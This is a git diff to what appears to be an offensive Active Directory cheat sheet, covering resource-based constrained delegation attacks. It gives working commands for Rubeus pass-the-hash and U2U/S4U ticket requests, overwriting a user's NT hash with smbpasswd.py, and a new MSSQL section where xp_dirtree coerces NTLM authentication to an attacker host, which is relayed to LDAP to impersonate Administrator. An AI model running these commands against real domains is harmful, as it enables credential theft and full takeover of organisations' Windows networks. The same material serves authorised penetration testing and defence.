@@ -138,30 +138,59 @@ Since the service is not protected in the obtained ticket, the attacker can chan
 
 In case where you have sufficient rights to configure an RBCD on a machine (for example with an unsigned authentication coerce via HTTP) but ms-ds-machineaccountquota equals 0, there is no ADCS with the HTTP endpoint and the Shadow Credentials attack is not possible (domain level to 2012 for example), you can realize a RBCD from a SPN-less user account. 
 
-1) Configure the machine account to trust the user account you control (NTLM Relay, with the machine account's creds,...)
+### 1) Configure the machine account to trust the user account you control (NTLM Relay, with the machine account's creds,...)
 
-2) Obtain a TGT for the user via pass-the-hash:
+### 2) Obtain a TGT for the user via pass-the-hash:
 
        .\Rubeus.exe asktgt /user:user1 /rc4:<NT_hash> /nowrap
 
-3) Request a Service Ticket via U2U (S4USelf request) with the previous TGT specified in /tgs: (additional ticket added to the request body identifying the target user account) and /ticket: (authentication). If U2U is not used, the KDC cannot find the account's LT key when a UPN is specified instead of a SPN. The account to impersonate via the future S4U request is also present: 
+### 3) Request a Service Ticket via U2U (S4USelf request) with the previous TGT specified in /tgs: (additional ticket added to the request body identifying the target user account) and /ticket: (authentication). If U2U is not used, the KDC cannot find the account's LT key when a UPN is specified instead of a SPN. The account to impersonate via the future S4U request is also present: 
 
        .\Rubeus.exe asktgs /u2u /ticket:TGT.kirbi /tgs:TGT.kirbi /targetuser:Administrator /nowrap
 
-4) Retrieve the TGT session key in HEX format
+### 4) Retrieve the TGT session key in HEX format
 
        import binascii, base64
        print(binascii.hexlify(base64.b64decode("<TGT_SESSION_KEY_B64>")).decode())
 
-6) Now, change the user's long term key (his RC4 NT hash actually) to be equal to the TGT session key. The ST sent in the S4UProxy is encrypted with the session key, but the KDC will try to decipher it with the user's long term key, this is why the LT key must be equal to the session key (WARNING !!! The user's password is now equal to an unknown value, you have to use a sacrificial account to realise this attack).
+### 6) Now, change the user's long term key (his RC4 NT hash actually) to be equal to the TGT session key. The ST sent in the S4UProxy is encrypted with the session key, but the KDC will try to decipher it with the user's long term key, this is why the LT key must be equal to the session key (WARNING !!! The user's password is now equal to an unknown value, you have to use a sacrificial account to realise this attack).
 
        smbpasswd.py -newhashes :sessionKey 'domain.local'/'user1':'Password123!'@'DC'
    
-7) Realize the S4UProxy request with the previous S4USelf U2U ticket (ciphered with the session key) as additional ticket and the original TGT as ticket:
+### 7) Realize the S4UProxy request with the previous S4USelf U2U ticket (ciphered with the session key) as additional ticket and the original TGT as ticket:
 
        .\Rubeus.exe s4u /msdsspn:cifs/target.domain.local /ticket:TGT.kirbi /tgs:U2U.kirbi
 
-8) Finally, use this ticket to do whatever you want!
+### 8) Finally, use this ticket to do whatever you want!
+
+# RBCD from MSSQL Server
+
+If we have sufficient access to a MSSQL server we can use the xp_dirtree in order to leak the Net-NTLM hash of the machine account. Additionally, the Web Service client must be running on the machine in order to trick the authentication from SMB to HTTP and avoid the NTLM signature (authentication must be sent to @80):
+
+## 1) Create a DNS record in order to be able to leak the NTLM hash externally
+
+### 2) Use the xp_dirtree (or xp_fileexist) function to the created DNS record on @80. This will force the authentication and leak the hash
+
+### 3) Relay the machine hash to the LDAP server to add a controlled account (with a SPN for the further S4USelf request) to the msDS-AllowedToActOnBehalfOfOtherIdentity of the target machine
+
+### 4) Now we can ask a ST for a user we want to impersonate for a service on the machine
+
+##### Add the DNS
+
+    Invoke-DNSUpdate -DNSType A -DNSName attacker.domain.local -DNSData <attacker_IP> -Realm domain.local
+
+##### On our machine, waiting for the leak
+#https://gist.github.com/3xocyte/4ea8e15332e5008581febdb502d0139c
+
+    python rbcd_relay.py 192.168.24.10 domain.local 'target$' <controlledAccountWithASPN>
+
+##### ON the MSSQL server
+
+    SQLCMD -S <MSSQL_instance> -Q "exec master.dbo.xp_dirtree '\\attacker@80\a'" -U Admin -P Admin
+
+##### After the attack, ask for a ST with full S4U
+
+    .\Rubeus.exe s4u /user:<controlled_account> /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/<target> /domain:domain.local /dc:DC.domain.local /ptt
 
 #### 1) addcomputer.py
 
